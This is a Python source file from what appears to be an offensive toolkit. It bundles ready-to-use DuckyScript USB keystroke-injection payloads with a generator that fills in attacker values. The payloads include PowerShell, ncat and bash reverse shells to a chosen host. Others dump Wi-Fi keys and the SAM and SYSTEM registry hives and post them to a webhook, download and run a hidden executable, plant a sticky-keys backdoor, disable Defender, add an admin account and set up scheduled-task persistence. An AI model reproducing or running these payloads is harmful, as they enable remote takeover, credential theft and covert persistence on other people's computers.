# language: Python, file: Program/usb/payloads.py, target: Red Sky usb — DuckyScript payload library
# Bundled DuckyScript templates + custom generator with variable substitution.

import sys
from pathlib import Path
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


USB_DIR = OUTPUT_DIR / "usb"


PAYLOADS: Dict[str, Dict] = {
    "win_revshell_ps": {
        "desc": "Windows PowerShell reverse shell via TCPClient",
        "vars": ["LHOST", "LPORT"],
        "body": """REM windows powershell reverse shell
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -W Hidden -Command "$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sdata=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sdata,0,$sdata.Length);$s.Flush()};$c.Close()"
ENTER""",
    },
    "win_revshell_cmd": {
        "desc": "cmd.exe reverse shell via ncat (needs ncat on target)",
        "vars": ["LHOST", "LPORT"],
        "body": """REM ncat reverse shell
DELAY 2000
GUI r
DELAY 500
STRING cmd /c ncat {LHOST} {LPORT} -e cmd.exe
ENTER""",
    },
    "win_wifi_dump": {
        "desc": "Dump saved WiFi profiles + keys, POST to webhook",
        "vars": ["WEBHOOK"],
        "body": """REM wifi profile dump and exfil
DELAY 2000
GUI r
DELAY 500
STRING cmd /c netsh wlan show profiles > %TEMP%\\wifi.txt && netsh wlan show profiles | findstr /C:":" > %TEMP%\\names.txt
ENTER
DELAY 3000
STRING powershell -NoP -Command "Get-Content %TEMP%\\names.txt | %{$n=($_ -split ':')[1].Trim(); netsh wlan show profile name=$n key=clear | Select-String 'Key Content|Contenu de la' | %{$_.Line}}" > %TEMP%\\keys.txt
ENTER
DELAY 3000
STRING cmd /c curl -X POST --data-binary @%TEMP%\\keys.txt {WEBHOOK}
ENTER
DELAY 2000
STRING cmd /c del %TEMP%\\wifi.txt %TEMP%\\names.txt %TEMP%\\keys.txt
ENTER""",
    },
    "win_sam_dump": {
        "desc": "Dump SAM + SYSTEM registry hives (needs admin), exfil",
        "vars": ["WEBHOOK"],
        "body": """REM sam + system dump
DELAY 2000
GUI r
DELAY 500
STRING cmd /c reg save HKLM\\SAM %TEMP%\\s.hiv /y & reg save HKLM\\SYSTEM %TEMP%\\y.hiv /y
ENTER
DELAY 4000
STRING cmd /c curl -X POST --data-binary @%TEMP%\\s.hiv {WEBHOOK}/sam
ENTER
DELAY 3000
STRING cmd /c curl -X POST --data-binary @%TEMP%\\y.hiv {WEBHOOK}/sys
ENTER
DELAY 2000
STRING cmd /c del %TEMP%\\s.hiv %TEMP%\\y.hiv
ENTER""",
    },
    "win_download_exec": {
        "desc": "Download + execute a payload from a URL",
        "vars": ["URL"],
        "body": """REM download and run
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -W Hidden -Command "iwr -Uri '{URL}' -OutFile $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden"
ENTER""",
    },
    "win_sethc_ifeo": {
        "desc": "IFEO debugger on sethc.exe — sticky keys becomes cmd (needs admin)",
        "vars": [],
        "body": """REM sethc IFEO
DELAY 2000
GUI r
DELAY 500
STRING cmd /c reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f
ENTER""",
    },
    "win_defender_off": {
        "desc": "Disable Defender real-time monitoring (needs admin)",
        "vars": [],
        "body": """REM disable defender RTP
DELAY 2000
GUI r
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true"
ENTER""",
    },
    "win_defender_exclude": {
        "desc": "Add a folder to Defender exclusions",
        "vars": ["PATH"],
        "body": """REM add exclusion
DELAY 2000
GUI r
DELAY 500
STRING powershell -Command "Add-MpPreference -ExclusionPath '{PATH}'"
ENTER""",
    },
    "win_add_admin": {
        "desc": "Create a local admin account",
        "vars": ["USER", "PASS"],
        "body": """REM create admin
DELAY 2000
GUI r
DELAY 500
STRING cmd /c net user {USER} {PASS} /add && net localgroup administrators {USER} /add
ENTER""",
    },
    "win_schtask_persist": {
        "desc": "Persistence via scheduled task",
        "vars": ["PAYLOAD_PATH", "TASK_NAME"],
        "body": """REM persistence task
DELAY 2000
GUI r
DELAY 500
STRING cmd /c schtasks /create /tn "{TASK_NAME}" /tr "{PAYLOAD_PATH}" /sc onlogon /rl highest /f
ENTER""",
    },
    "linux_revshell": {
        "desc": "Linux bash reverse shell (terminal must be reachable)",
        "vars": ["LHOST", "LPORT"],
        "body": """REM linux revshell
DELAY 2000
CTRL ALT t
DELAY 1500
STRING bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1
ENTER""",
    },
    "mac_revshell": {
        "desc": "macOS bash reverse shell",
        "vars": ["LHOST", "LPORT"],
        "body": """REM macos revshell
DELAY 2000
GUI SPACE
DELAY 500
STRING Terminal
ENTER
DELAY 1500
STRING bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1
ENTER""",
    },
    "win_lock_screen": {
        "desc": "Lock the screen and blank input",
        "vars": [],
        "body": """REM lock screen
DELAY 2000
GUI l""",
    },
    "win_open_url": {
        "desc": "Open a URL in the default browser",
        "vars": ["URL"],
        "body": """REM open url
DELAY 2000
GUI r
DELAY 500
STRING {URL}
ENTER""",
    },
}


def cmd_list() -> int:
    print_info(f"{len(PAYLOADS)} bundled payload(s)")
    print()
    for name, p in PAYLOADS.items():
        v = ", ".join(p["vars"]) if p["vars"] else "(no vars)"
        print(f"  {ARTERY}▓{RESET} {BONE}{name:<28}{RESET} {ASH}{p['desc']}{RESET}")
        print(f"      {CLOT}vars: {v}{RESET}")
    return 0


def cmd_show(name: str) -> int:
    if name not in PAYLOADS:
        print_err(f"unknown payload: {name}")
        return 1
    p = PAYLOADS[name]
    print_info(f"{name} — {p['desc']}")
    print()
    print(p["body"])
    return 0


def cmd_generate(name: str, vars_str: List[str], out_file: str = "") -> int:
    if name not in PAYLOADS:
        print_err(f"unknown payload: {name}")
        print_info("run 'redsky usb payloads list'")
        return 1

    p = PAYLOADS[name]
    vals: Dict[str, str] = {}
    for v in vars_str:
        if "=" in v:
            k, val = v.split("=", 1)
            vals[k] = val

    missing = [v for v in p["vars"] if v not in vals]
    if missing:
        print_err(f"missing vars: {', '.join(missing)}")
        print_info("pass as KEY=value on the command line")
        return 1

    body = p["body"]
    for k, v in vals.items():
        body = body.replace("{" + k + "}", v)

    USB_DIR.mkdir(parents=True, exist_ok=True)
    out = Path(out_file) if out_file else USB_DIR / f"payload_{name}.txt"
    out.write_text(body)

    print_ok(f"generated {out}")
    print_kv("lines", len(body.splitlines()))
    print_kv("payload", name)
    print()
    print_info("next: redsky usb script parse " + str(out) + " --target digispark|pico")
    return 0


def run_cli(args):
    if not args:
        print_err("usage: redsky usb payloads <list|show|gen> [args]")
        return 2
    sub = args[0].lower()
    if sub == "list":
        return cmd_list()
    if sub == "show":
        if len(args) < 2:
            print_err("show needs a payload name")
            return 2
        return cmd_show(args[1])
    if sub in ("gen", "generate"):
        if len(args) < 2:
            print_err("gen needs a payload name")
            return 2
        out = ""
        if "--out" in args:
            i = args.index("--out")
            if i + 1 < len(args):
                out = args[i + 1]
        vars_str = [a for a in args[2:] if "=" in a]
        return cmd_generate(args[1], vars_str, out)
    print_err(f"unknown payloads sub-command: {sub}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
